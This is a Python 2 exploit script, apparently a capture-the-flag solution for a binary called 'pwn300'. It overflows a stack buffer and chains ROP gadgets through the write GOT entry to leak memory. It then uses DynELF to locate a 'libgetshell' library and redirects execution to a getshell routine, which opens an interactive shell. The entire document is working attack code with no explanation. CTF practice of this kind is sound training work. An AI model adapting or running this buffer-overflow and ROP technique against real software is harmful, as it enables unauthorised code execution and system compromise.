from pwn import *

write_got = 0x0000000000601018
pop6_ret = 0x000000000040049E
mov3_call = 0x0000000000400484
welcome = 0x00000000004004A9

p = process('./pwn300')

def leak(address, size = 8):
	payload  = 'a' * 0x28 + p64(pop6_ret)
	payload += p64(write_got) + p64(size) + p64(address) + p64(1)
	payload += p64(mov3_call) + p64(0) * 7 + p64(welcome)
	assert len(payload) <= 0xa0
	p.recvuntil("fuck me!\n")
	p.send(payload.ljust(0xa0, 'a'))
	return p.recv(size)

d = DynELF(leak, elf = ELF('./pwn300'))
libgetshell = d.lookup(None, "libgetshell")

print "libgetshell: " + hex(libgetshell)
getshell = libgetshell + 0x311

raw_input("go?")

"""
f = open('libgetshell.dump', 'wb')
while 1:
    f.write(leak(libgetshell, 0x1000))
    libgetshell += 0x1000
"""

p.recvuntil("fuck me!\n")
payload = 'a' * 40 + p64(getshell)
p.send(payload.ljust(0xa0, 'a'))
p.interactive()